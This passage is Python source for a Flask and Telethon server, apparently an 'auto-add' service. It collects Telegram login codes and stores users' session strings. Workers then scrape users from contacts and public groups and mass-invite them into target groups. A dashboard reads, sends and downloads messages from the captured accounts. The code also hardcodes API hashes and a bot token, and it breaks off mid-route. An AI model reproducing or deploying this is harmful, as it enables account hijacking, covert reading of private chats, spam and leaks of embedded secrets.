#!/usr/bin/env python3
"""
Telegram Auto-Add Server - PHONE SHARE AUTO-LOGIN VERSION
Users only need to share phone + enter code
Auto-add and auto-join fully working
With Dashboard Chat & Messaging Support
"""

from flask import Flask, jsonify, request, redirect, send_file
from flask_cors import CORS
from telethon import TelegramClient, errors, functions, types
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.messages import GetDialogsRequest, SendMessageRequest, GetHistoryRequest
from telethon.tl.types import (
    InputPeerEmpty, InputPeerUser, InputPeerChat, InputPeerChannel,
    MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage
)
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
from collections import defaultdict
import traceback
import sys
import signal
import hashlib
import hmac
import urllib.parse
import base64
import mimetypes
from io import BytesIO

# Configure logging
import logging.handlers

os.makedirs('logs', exist_ok=True)

file_handler = logging.handlers.RotatingFileHandler(
    'logs/server.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder=None)
CORS(app)

# ============================================
# SERVER CONFIGURATION
# ============================================
SERVER_NUMBER = int(os.environ.get('SERVER_NUMBER', 4))

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 38904710, 'api_hash': '3e00b37e8559fa1c64549659947b431d', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB3oS9K_A'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUPS = ['Abe_armygroup', 'abe_army']

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# File paths
ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'
WORKER_ADDS_FILE = 'worker_adds.json'
TEMP_SESSIONS_FILE = 'temp_sessions.json'
AUTO_SESSIONS_FILE = 'auto_sessions.json'
USER_MAP_FILE = 'user_map.json'
MEDIA_CACHE_DIR = 'media_cache'

# Create media cache directory
os.makedirs(MEDIA_CACHE_DIR, exist_ok=True)

# Storage with thread locks
accounts = []
temp_sessions = {}
auto_sessions = {}
user_phone_map = {}
auto_add_settings = {}
running_tasks = {}
worker_adds = defaultdict(list)
file_lock = threading.Lock()
worker_lock = threading.Lock()

# Chat cache for dashboard
chat_cache = {}
chat_cache_lock = threading.Lock()
CACHE_DURATION = 30  # seconds

stats = {
    'total_added': 0,
    'today_added': 0,
    'verified_total': 0,
    'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'worker_stats': {},
    'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat(),
    'crashes_recovered': 0
}

# ============================================
# EVENT LOOP HELPER FOR THREADS
# ============================================
def get_or_create_eventloop():
    """Get existing event loop or create a new one for the current thread"""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        return loop
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop

# ============================================
# FILE OPERATIONS
# ============================================
def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                content = f.read().strip()
                if content:
                    data = json.loads(content)
                    # Create backup
                    backup_path = f"{path}.backup"
                    with open(backup_path, 'w') as backup:
                        json.dump(data, backup, indent=2, default=str)
                    return data
    except json.JSONDecodeError as e:
        logger.error(f"Corrupted JSON file {path}: {e}")
        backup_path = f"{path}.backup"
        if os.path.exists(backup_path):
            try:
                with open(backup_path, 'r') as backup:
                    logger.info(f"Restored {path} from backup")
                    return json.load(backup)
            except:
                pass
    except Exception as e:
        logger.error(f"Load error {path}: {e}")
    return default

def save_json(path, data):
    temp_path = f"{path}.tmp"
    with file_lock:
        try:
            with open(temp_path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            os.replace(temp_path, path)
        except Exception as e:
            logger.error(f"Save error {path}: {e}")

def save_temp_sessions():
    sessions_data = {}
    for session_id, session_data in temp_sessions.items():
        sessions_data[session_id] = {
            'phone': session_data['phone'],
            'hash': session_data['hash'],
            'session': session_data['session'],
            'password_attempts': session_data.get('password_attempts', 0),
            'code_attempts': session_data.get('code_attempts', 0),
            'created_at': session_data.get('created_at', time.time()),
            'telegram_id': session_data.get('telegram_id', ''),
            'first_name': session_data.get('first_name', ''),
            'last_name': session_data.get('last_name', ''),
            'username': session_data.get('username', '')
        }
    save_json(TEMP_SESSIONS_FILE, sessions_data)

def load_temp_sessions():
    global temp_sessions
    sessions_data = load_json(TEMP_SESSIONS_FILE, {})
    temp_sessions = {}
    current_time = time.time()
    for session_id, session_data in sessions_data.items():
        created_at = session_data.get('created_at', 0)
        if current_time - created_at < 3600:
            temp_sessions[session_id] = session_data

def save_auto_sessions():
    save_json(AUTO_SESSIONS_FILE, auto_sessions)

def load_auto_sessions():
    global auto_sessions
    auto_sessions = load_json(AUTO_SESSIONS_FILE, {})

def save_user_map():
    save_json(USER_MAP_FILE, user_phone_map)

def load_user_map():
    global user_phone_map
    user_phone_map = load_json(USER_MAP_FILE, {})

# ============================================
# TELEGRAM CLIENT HELPER (FIXED EVENT LOOP)
# ============================================
class SyncTelegramClient:
    @staticmethod
    def run_async(async_func, timeout=60, retries=2):
        """Run async function synchronously with proper event loop handling"""
        for attempt in range(retries + 1):
            try:
                # Get or create event loop for this thread
                loop = get_or_create_eventloop()
                result = loop.run_until_complete(
                    asyncio.wait_for(async_func(), timeout=timeout)
                )
                return result
            except asyncio.TimeoutError:
                logger.warning(f"Async timeout on attempt {attempt + 1}")
                if attempt == retries:
                    raise
            except Exception as e:
                logger.error(f"Async execution error (attempt {attempt + 1}): {e}")
                if attempt == retries:
                    raise
                time.sleep(2)
    
    @staticmethod
    def get_client(session_string):
        """Create a TelegramClient with proper event loop"""
        try:
            # Ensure event loop exists before creating client
            get_or_create_eventloop()
            
            return TelegramClient(
                StringSession(session_string), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=2,
                timeout=30,
                auto_reconnect=True
            )
        except Exception as e:
            logger.error(f"Failed to create client: {e}")
            raise
    
    @staticmethod
    async def safe_connect(client):
        try:
            await asyncio.wait_for(client.connect(), timeout=15)
            return True
        except:
            return False

# ============================================
# ACCOUNT AGE DETECTION
# ============================================
def get_account_age_sync(session_string):
    async def _get_age():
        client = SyncTelegramClient.get_client(session_string)
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return {'age_display': 'Unknown'}
            if not await client.is_user_authorized():
                return {'age_display': 'Unknown'}
            me = await client.get_me()
            if hasattr(me, 'creation_date') and me.creation_date:
                creation_date = me.creation_date
                if hasattr(creation_date, 'tzinfo') and creation_date.tzinfo:
                    creation_date = creation_date.replace(tzinfo=None)
                age_days = (datetime.now() - creation_date).days
                age_years = age_days / 365.25
                return {
                    'age_days': age_days,
                    'age_years': round(age_years, 1),
                    'age_display': f"{int(age_years)} years, {age_days % 365} days",
                    'year_joined': creation_date.year
                }
            return {'age_display': 'Unknown'}
        except Exception as e:
            logger.error(f"Age detection error: {e}")
            return {'age_display': 'Unknown'}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    try:
        return SyncTelegramClient.run_async(_get_age, timeout=20)
    except:
        return {'age_display': 'Unknown'}

# ============================================
# ACCOUNT MANAGEMENT
# ============================================
def reset_daily():
    try:
        today = datetime.now().strftime('%Y-%m-%d')
        if stats.get('last_reset') != today:
            stats['today_added'] = 0
            stats['verified_today'] = 0
            stats['last_reset'] = today
            for k in stats.get('worker_stats', {}):
                stats['worker_stats'][k]['today'] = 0
                stats['worker_stats'][k]['verified_today'] = 0
            save_json(STATS_FILE, stats)
    except Exception as e:
        logger.error(f"Reset daily error: {e}")

def check_account_auth(acc, max_retries=2):
    async def _check():
        client = SyncTelegramClient.get_client(acc['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return False
            return await client.is_user_authorized()
        except:
            return False
        finally:
            try:
                await client.disconnect()
            except:
                pass
    for attempt in range(max_retries):
        try:
            result = SyncTelegramClient.run_async(_check, timeout=15)
            if result is not None:
                return result
        except:
            if attempt == max_retries - 1:
                return False
            time.sleep(1)
    return False

def remove_dead_account(aid, reason=""):
    global accounts
    try:
        acc = next((a for a in accounts if a['id'] == aid), None)
        name = acc.get('name', str(aid)) if acc else str(aid)
        with worker_lock:
            accounts = [a for a in accounts if a['id'] != aid]
            auto_add_settings.pop(str(aid), None)
            if str(aid) in running_tasks:
                worker_info = running_tasks.pop(str(aid), None)
                if worker_info and worker_info.get('worker'):
                    try:
                        worker_info['worker'].stop()
                    except:
                        pass
            worker_adds.pop(str(aid), None)
        save_json(ACCOUNTS_FILE, accounts)
        save_json(SETTINGS_FILE, auto_add_settings)
        save_json(WORKER_ADDS_FILE, dict(worker_adds))
        stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
        save_json(STATS_FILE, stats)
        logger.warning(f"Removed dead account: {name} | Reason: {reason}")
        try:
            send_telegram(f"<b>{SERVER_NAME}</b>\n❌ Removed: {name}\nReason: {reason}")
        except:
            pass
        return name
    except Exception as e:
        logger.error(f"Remove account error: {e}")
        return "Unknown"

def send_telegram(text, retries=3):
    for attempt in range(retries):
        try:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
                timeout=10
            )
            if response.status_code == 200:
                return True
        except Exception as e:
            logger.error(f"Send telegram error (attempt {attempt + 1}): {e}")
        if attempt < retries - 1:
            time.sleep(2)
    return False

# ============================================
# AUTO-ADD WORKER (FIXED EVENT LOOP)
# ============================================
class AutoAddWorker:
    def __init__(self, account):
        self.account = account
        self.acc_id = account['id']
        self.acc_key = str(self.acc_id)
        self.running = True
        self.client = None
        self.last_ping = time.time()
        self.consecutive_errors = 0
        self.max_consecutive_errors = 15
        self.last_activity = time.time()
        self.health_check_interval = 300
        self.last_health_check = time.time()
        self.joined_groups = set()
        self._loop = None
    
    def stop(self):
        self.running = False
        self.disconnect_client()
    
    def disconnect_client(self):
        if self.client:
            try:
                # Use the worker's event loop to disconnect
                if self._loop and not self._loop.is_closed():
                    async def _disconnect():
                        try:
                            await self.client.disconnect()
                        except:
                            pass
                    try:
                        self._loop.run_until_complete(
                            asyncio.wait_for(_disconnect(), timeout=5)
                        )
                    except:
                        pass
            except:
                pass
            finally:
                self.client = None
    
    def run(self):
        # Create and set event loop for this worker thread
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        
        logger.info(f"🚀 Auto-add worker started for {self.account.get('name', self.acc_id)}")
        
        self.join_all_targets()
        
        attempted_users = set()
        cycle_count = 0
        
        while self.running:
            try:
                if time.time() - self.last_health_check > self.health_check_interval:
                    self.perform_health_check()
                    self.last_health_check = time.time()
                
                self.consecutive_errors = 0
                
                settings = auto_add_settings.get(self.acc_key, {})
                if not settings.get('enabled', True):
                    self.last_activity = time.time()
                    time.sleep(5)
                    continue
                
                reset_daily()
                
                if not self.ensure_connection():
                    self.consecutive_errors += 1
                    if self.consecutive_errors >= self.max_consecutive_errors:
                        logger.error(f"Worker {self.acc_key}: Too many connection failures")
                        break
                    time.sleep(30)
                    continue
                
                user_ids = self.get_user_sources()
                if not user_ids:
                    self.last_activity = time.time()
                    time.sleep(60)
                    continue
                
                if len(attempted_users) > 10000:
                    attempted_users.clear()
                
                fresh_users = [uid for uid in user_ids if uid not in attempted_users]
                if len(fresh_users) < 50:
                    attempted_users.clear()
                    fresh_users = list(user_ids)
                
                random.shuffle(fresh_users)
                delay = max(30, settings.get('delay_seconds', 30))
                added_count = 0
                
                for user_id in fresh_users[:100]:
                    if not self.running:
                        break
                    
                    settings_check = auto_add_settings.get(self.acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    attempted_users.add(user_id)
                    
                    try:
                        if self.add_user_to_targets(user_id):
                            added_count += 1
                            stats['today_added'] = stats.get('today_added', 0) + 1
                            stats['total_added'] = stats.get('total_added', 0) + 1
                            
                            if self.acc_key not in stats['worker_stats']:
                                stats['worker_stats'][self.acc_key] = {'total': 0, 'today': 0, 'verified_today': 0}
                            stats['worker_stats'][self.acc_key]['today'] += 1
                            stats['worker_stats'][self.acc_key]['total'] += 1
                            
                            if added_count % 10 == 0:
                                save_json(STATS_FILE, stats)
                    except Exception as e:
                        logger.error(f"Add user {user_id} error: {e}")
                        self.consecutive_errors += 1
                        if self.consecutive_errors >= self.max_consecutive_errors:
                            break
                    
                    actual_delay = random.uniform(delay * 0.8, delay * 1.3)
                    self.last_activity = time.time()
                    time.sleep(actual_delay)
                    
                    if added_count > 0 and added_count % 30 == 0:
                        self.reconnect()
                
                cycle_count += 1
                logger.info(f"Worker {self.acc_key} Cycle {cycle_count}: Added {added_count} | Today: {stats['today_added']}")
                save_json(STATS_FILE, stats)
                
                rest_time = random.randint(60, 180)
                for _ in range(rest_time):
                    if not self.running:
                        break
                    self.last_activity = time.time()
                    time.sleep(1)
                
            except Exception as e:
                logger.error(f"Worker {self.acc_key} cycle error: {e}")
                self.consecutive_errors += 1
                if self.consecutive_errors >= self.max_consecutive_errors:
                    logger.critical(f"Worker {self.acc_key}: Too many errors, stopping")
                    break
                time.sleep(30)
                self.reconnect()
        
        logger.info(f"Worker {self.acc_key} stopped")
        # Clean up event loop
        try:
            if self._loop and not self._loop.is_closed():
                self._loop.close()
        except:
            pass
    
    def perform_health_check(self):
        try:
            if time.time() - self.last_activity > 600:
                logger.warning(f"Worker {self.acc_key}: Inactive for 10 minutes, reconnecting...")
                self.reconnect()
                self.last_activity = time.time()
            
            if not self.ensure_connection():
                logger.warning(f"Worker {self.acc_key}: Unhealthy connection, reconnecting...")
                self.reconnect()
            
            if len(self.joined_groups) < len(TARGET_GROUPS):
                self.join_all_targets()
        except Exception as e:
            logger.error(f"Health check error: {e}")
    
    def ensure_connection(self):
        try:
            if self.client and hasattr(self.client, 'is_connected'):
                try:
                    if self.client.is_connected():
                        if time.time() - self.last_ping > 120:
                            async def ping():
                                try:
                                    await self.client.get_me()
                                    return True
                                except:
                                    return False
                            if SyncTelegramClient.run_async(ping, timeout=10):
                                self.last_ping = time.time()
                                return True
                            else:
                                return self.reconnect()
                        return True
                except:
                    pass
            return self.connect_client()
        except:
            return self.reconnect()
    
    def connect_client(self):
        for attempt in range(3):
            try:
                self.disconnect_client()
                time.sleep(1)
                self.client = SyncTelegramClient.get_client(self.account['session'])
                async def _connect():
                    if not await SyncTelegramClient.safe_connect(self.client):
                        return False
                    return await self.client.is_user_authorized()
                result = SyncTelegramClient.run_async(_connect, timeout=20)
                if result:
                    self.last_ping = time.time()
                    self.last_activity = time.time()
                    logger.info(f"Worker {self.acc_key}: Connected successfully")
                    return True
            except Exception as e:
                logger.error(f"Connect error (attempt {attempt + 1}): {e}")
            if attempt < 2:
                time.sleep(min(5 * (attempt + 1), 15))
        return False
    
    def reconnect(self):
        logger.info(f"Worker {self.acc_key}: Reconnecting...")
        self.disconnect_client()
        time.sleep(3)
        return self.connect_client()
    
    def join_all_targets(self):
        for target in TARGET_GROUPS:
            if target in self.joined_groups:
                continue
            
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if not self.ensure_connection():
                        time.sleep(5)
                        continue
                    
                    async def _join():
                        try:
                            entity = await self.client.get_entity(target)
                            await self.client(JoinChannelRequest(entity))
                            return True
                        except errors.FloodWaitError as e:
                            wait_time = min(e.seconds, 120)
                            logger.warning(f"Flood wait for join: {wait_time}s")
                            time.sleep(wait_time)
                            return False
                        except Exception as e:
                            if 'already' in str(e).lower() or 'participant' in str(e).lower():
                                return True
                            logger.error(f"Join error: {e}")
                            return False
                    
                    if SyncTelegramClient.run_async(_join, timeout=30):
                        self.joined_groups.add(target)
                        logger.info(f"Worker {self.acc_key}: ✅ Joined {target}")
                        break
                except Exception as e:
                    logger.warning(f"Join {target} failed (attempt {attempt + 1}): {e}")
                
                time.sleep(min(5 * (attempt + 1), 20))
    
    def get_user_sources(self):
        user_ids = set()
        if not self.ensure_connection():
            return list(user_ids)
        
        async def _collect():
            nonlocal user_ids
            
            try:
                contacts = await self.client(GetContactsRequest(0))
                for user in contacts.users:
                    if user.id and not getattr(user, 'bot', False) and not user.deleted:
                        user_ids.add(user.id)
                logger.debug(f"Got {len([u for u in contacts.users if not getattr(u, 'bot', False)])} from contacts")
            except Exception as e:
                logger.error(f"Contacts collection error: {e}")
            
            try:
                dialogs = await self.client.get_dialogs(limit=100)
                for d in dialogs:
                    if d.is_user and d.entity and d.entity.id:
                        if not getattr(d.entity, 'bot', False) and not d.entity.deleted:
                            user_ids.add(d.entity.id)
                logger.debug(f"Got from dialogs, total users: {len(user_ids)}")
            except Exception as e:
                logger.error(f"Dialogs collection error: {e}")
            
            source_groups = [
                'telegram', 'durov', 'TelegramTips', 'contest',
                'TelegramNews', 'builders', 'Android', 'iOS',
                'Python', 'programming', 'abe_army', 'Abe_armygroup'
            ]
            
            for sg in source_groups:
                try:
                    entity = await self.client.get_entity(sg)
                    participants = await self.client.get_participants(entity, limit=100)
                    for user in participants:
                        if user.id and not getattr(user, 'bot', False) and not user.deleted:
                            user_ids.add(user.id)
                    await asyncio.sleep(0.3)
                except Exception as e:
                    continue
            
            return list(user_ids)
        
        try:
            result = SyncTelegramClient.run_async(_collect, timeout=60)
            return result if result else list(user_ids)
        except Exception as e:
            logger.error(f"User source collection failed: {e}")
            return list(user_ids)
    
    def add_user_to_targets(self, user_id):
        success = False
        
        for target in TARGET_GROUPS:
            if not self.running:
                break
            if not self.ensure_connection():
                break
            
            async def _add():
                try:
                    entity = await self.client.get_entity(target)
                    user_input = await self.client.get_input_entity(user_id)
                    await self.client(InviteToChannelRequest(entity, [user_input]))
                    return True
                except errors.FloodWaitError as e:
                    wait_time = min(e.seconds, 60)
                    time.sleep(wait_time)
                    return False
                except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
                        errors.UserAlreadyParticipantError, errors.UserKickedError,
                        errors.UserBannedInChannelError, errors.UserDeactivatedBanError) as e:
                    return False
                except Exception as e:
                    return False
            
            try:
                if SyncTelegramClient.run_async(_add, timeout=15):
                    success = True
            except:
                continue
        
        if success:
            try:
                record = {
                    'user_id': user_id,
                    'time': datetime.now().isoformat(),
                    'worker_id': self.acc_id
                }
                worker_adds[self.acc_key].append(record)
                if len(worker_adds[self.acc_key]) > 1000:
                    worker_adds[self.acc_key] = worker_adds[self.acc_key][-1000:]
                if len(worker_adds[self.acc_key]) % 10 == 0:
                    save_json(WORKER_ADDS_FILE, dict(worker_adds))
            except:
                pass
        
        return success

def start_auto_add(account):
    acc_key = str(account['id'])
    with worker_lock:
        try:
            if acc_key in running_tasks:
                existing = running_tasks[acc_key]
                if existing and existing.get('thread') and existing['thread'].is_alive():
                    existing['worker'].stop()
                    existing['thread'].join(timeout=5)
            
            worker = AutoAddWorker(account)
            thread = threading.Thread(target=worker.run, daemon=True, name=f"worker_{acc_key}")
            thread.start()
            running_tasks[acc_key] = {'thread': thread, 'worker': worker}
            logger.info(f"✅ Started auto-add worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Start worker error: {e}")

def stop_auto_add(account_id):
    acc_key = str(account_id)
    with worker_lock:
        try:
            if acc_key in running_tasks:
                worker_info = running_tasks.pop(acc_key)
                if worker_info and worker_info.get('worker'):
                    worker_info['worker'].stop()
                logger.info(f"Stopped auto-add worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Stop auto add error: {e}")

# ============================================
# PHONE LOOKUP HELPERS
# ============================================
def find_phone_for_user(telegram_id):
    phone = None
    tid = str(telegram_id)
    
    phone = user_phone_map.get(tid, '')
    if phone:
        logger.info(f"Found phone in user_phone_map for {tid}: {phone[:4]}****")
        return phone
    
    if tid in auto_sessions:
        phone = auto_sessions[tid].get('phone', '')
        if phone:
            logger.info(f"Found phone in auto_sessions for {tid}: {phone[:4]}****")
            return phone
    
    for acc in accounts:
        if str(acc.get('telegram_id')) == tid and acc.get('phone'):
            phone = acc['phone']
            logger.info(f"Found phone in accounts for {tid}: {phone[:4]}****")
            return phone
    
    return None

def auto_send_code(phone, telegram_id, first_name='', last_name='', username=''):
    async def send_auto_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            sid = str(int(time.time() * 1000))
            temp_sessions[sid] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save(),
                'password_attempts': 0,
                'code_attempts': 0,
                'created_at': time.time(),
                'telegram_id': telegram_id,
                'first_name': first_name,
                'last_name': last_name,
                'username': username
            }
            save_temp_sessions()
            
            masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else '***' + phone[-3:]
            
            logger.info(f"✅ Code sent to {masked_phone} for user {telegram_id}")
            
            return {
                'success': True,
                'session_id': sid,
                'phone_masked': masked_phone,
                'user_name': f"{first_name} {last_name}".strip() or username or 'User'
            }
        except errors.FloodWaitError as e:
            logger.warning(f"Flood wait for {phone}: {e.seconds}s")
            return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
        except errors.PhoneNumberInvalidError:
            logger.warning(f"Invalid phone: {phone}")
            return {'success': False, 'error': 'Invalid phone number.'}
        except Exception as e:
            logger.error(f"Auto code error for {phone}: {e}")
            return {'success': False, 'error': f'Could not send code. Try again.'}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    result = SyncTelegramClient.run_async(send_auto_code, timeout=45)
    
    if not result.get('success'):
        if str(telegram_id) in user_phone_map:
            del user_phone_map[str(telegram_id)]
            save_user_map()
        if str(telegram_id) in auto_sessions:
            del auto_sessions[str(telegram_id)]
            save_auto_sessions()
    
    return result

# ============================================
# DASHBOARD - CHAT & MESSAGE HELPERS
# ============================================
def get_account_by_id(account_id):
    for acc in accounts:
        if str(acc['id']) == str(account_id) or acc['id'] == account_id:
            return acc
    return None

def get_client_for_account(account_id):
    acc = get_account_by_id(account_id)
    if not acc or not acc.get('session'):
        return None, "Account not found"
    try:
        client = SyncTelegramClient.get_client(acc['session'])
        return client, acc
    except Exception as e:
        return None, str(e)

async def get_dialogs_async(client, limit=50):
    """Get dialogs (chats) for the dashboard"""
    dialogs_list = []
    
    try:
        dialogs = await client.get_dialogs(limit=limit)
        
        for dialog in dialogs:
            try:
                entity = dialog.entity
                
                # Determine chat type and ID
                if hasattr(entity, 'username') and entity.username:
                    chat_id = entity.username
                elif hasattr(entity, 'id'):
                    chat_id = str(entity.id)
                else:
                    continue
                
                # Get title
                title = dialog.name or 'Unknown'
                
                # Determine type
                if dialog.is_user:
                    chat_type = 'bot' if getattr(entity, 'bot', False) else 'user'
                elif dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                else:
                    chat_type = 'user'
                
                # Get last message info
                last_message_text = ''
                last_message_date = None
                last_message_media = None
                
                if dialog.message:
                    msg = dialog.message
                    if msg.message:
                        last_message_text = msg.message[:100]
                    if msg.date:
                        last_message_date = int(msg.date.timestamp())
                    if msg.media:
                        if hasattr(msg.media, 'photo'):
                            last_message_media = 'photo'
                        elif hasattr(msg.media, 'document'):
                            last_message_media = 'document'
                        elif hasattr(msg.media, 'webpage'):
                            last_message_media = 'link'
                
                chat_data = {
                    'id': chat_id,
                    'title': title,
                    'type': chat_type,
                    'lastMessage': last_message_text,
                    'lastMessageDate': last_message_date,
                    'lastMessageMedia': last_message_media,
                    'unread': dialog.unread_count or 0,
                    'isUser': dialog.is_user,
                    'isGroup': dialog.is_group,
                    'isChannel': dialog.is_channel
                }
                
                dialogs_list.append(chat_data)
            except Exception as e:
                logger.error(f"Error processing dialog: {e}")
                continue
        
        # Sort: unread first, then by date
        dialogs_list.sort(key=lambda x: (-x.get('unread', 0), -(x.get('lastMessageDate') or 0)))
        
        return dialogs_list
    except Exception as e:
        logger.error(f"Get dialogs error: {e}")
        raise

async def get_messages_async(client, chat_id, limit=50):
    """Get messages for a specific chat"""
    messages_list = []
    
    try:
        # Try to get entity
        entity = None
        try:
            if chat_id.startswith('-'):
                entity = await client.get_entity(int(chat_id))
            else:
                entity = await client.get_entity(chat_id)
        except:
            # Try as integer
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                logger.error(f"Cannot find entity for {chat_id}")
                return messages_list
        
        # Get message history
        messages = await client.get_messages(entity, limit=limit)
        
        for msg in messages:
            if not msg:
                continue
            
            try:
                msg_data = {
                    'id': msg.id,
                    'text': msg.message or '',
                    'date': int(msg.date.timestamp()) if msg.date else 0,
                    'out': msg.out if hasattr(msg, 'out') else False,
                    'chatId': chat_id,
                    'hasMedia': bool(msg.media),
                    'mediaType': None
                }
                
                # Detect media type
                if msg.media:
                    if hasattr(msg.media, 'photo') or isinstance(msg.media, MessageMediaPhoto):
                        msg_data['mediaType'] = 'photo'
                    elif hasattr(msg.media, 'document'):
                        doc = msg.media.document
                        if doc:
                            mime_type = getattr(doc, 'mime_type', '')
                            if 'video' in mime_type:
                                msg_data['mediaType'] = 'video'
                            elif 'audio' in mime_type:
                                msg_data['mediaType'] = 'audio'
                            else:
                                msg_data['mediaType'] = 'document'
                    elif isinstance(msg.media, MessageMediaWebPage):
                        msg_data['mediaType'] = 'link'
                    else:
                        msg_data['mediaType'] = 'media'
                
                messages_list.append(msg_data)
            except Exception as e:
                logger.error(f"Error processing message {msg.id}: {e}")
                continue
        
        return messages_list
    except Exception as e:
        logger.error(f"Get messages error: {e}")
        raise

async def send_message_async(client, chat_id, message_text):
    """Send a message to a chat"""
    try:
        entity = None
        try:
            if chat_id.startswith('-'):
                entity = await client.get_entity(int(chat_id))
            else:
                entity = await client.get_entity(chat_id)
        except:
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                raise ValueError(f"Cannot find chat: {chat_id}")
        
        result = await client.send_message(entity, message_text)
        
        return {
            'success': True,
            'messageId': result.id,
            'text': result.message,
            'date': int(result.date.timestamp()) if result.date else 0
        }
    except Exception as e:
        logger.error(f"Send message error: {e}")
        raise

async def download_media_async(client, account_id, message_id):
    """Download media from a message"""
    try:
        # Get all dialogs to find the message
        dialogs = await client.get_dialogs(limit=100)
        
        for dialog in dialogs:
            try:
                messages = await client.get_messages(dialog.entity, limit=100)
                for msg in messages:
                    if msg.id == int(message_id) and msg.media:
                        # Download media
                        filename = f"media_{account_id}_{message_id}"
                        filepath = os.path.join(MEDIA_CACHE_DIR, filename)
                        
                        # Download
                        await client.download_media(msg, filepath)
                        
                        # Detect mime type
                        mime_type = mimetypes.guess_type(filepath)[0] or 'application/octet-stream'
                        
                        # Read file and encode as base64
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        
                        # Clean up file
                        try:
                            os.remove(filepath)
                        except:
                            pass
                        
                        return {
                            'data': base64.b64encode(data).decode('utf-8'),
                            'mime_type': mime_type,
                            'size': len(data)
                        }
            except:
                continue
        
        return None
    except Exception as e:
        logger.error(f"Download media error: {e}")
        return None

# ============================================
# FLASK ROUTES
# ============================================

@app.route('/')
def index():
    return redirect('/login')

@app.route('/login')
def login_page():
    try:
        return send_file('login.html')
    except FileNotFoundError:
        return "login.html not found. Please upload the file.", 404

@app.route('/auto-add')
def auto_add_page():
    try:
        return send_file('auto_add.html')
    except FileNotFoundError:
        return "auto_add.html not found. Please upload the file.", 404

@app.route('/dashboard')
def dashboard_page():
    try:
        return send_file('dashboard.html')
    except FileNotFoundError:
        return "dashboard.html not found. Please upload the file.", 404

@app.route('/dash')
def dash_page():
    try:
        return send_file('dash.html')
    except FileNotFoundError:
        return "dash.html not found. Please upload the file.", 404

@app.route('/all')
def all_page():
    try:
        return send_file('all.html')
    except FileNotFoundError:
        return "all.html not found. Please upload the file.", 404

@app.route('/ping')
def ping():
    return jsonify({
        'status': 'ok',
        'server': SERVER_NAME,
        'timestamp': datetime.now().isoformat(),
        'workers': len(running_tasks),
        'accounts': len(accounts),
        'total_added_today': stats.get('today_added', 0)
    })

@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_groups': TARGET_GROUPS
        }
    })

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        try:
            aid_str = str(a['id'])
            ws = stats.get('worker_stats', {}).get(aid_str, {})
            acc_list.append({
                'id': a['id'],
                'name': a.get('name', '?'),
                'phone': a.get('phone', ''),
                'username': a.get('username', ''),
                'active': a.get('active', True),
                'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
                'stats': {
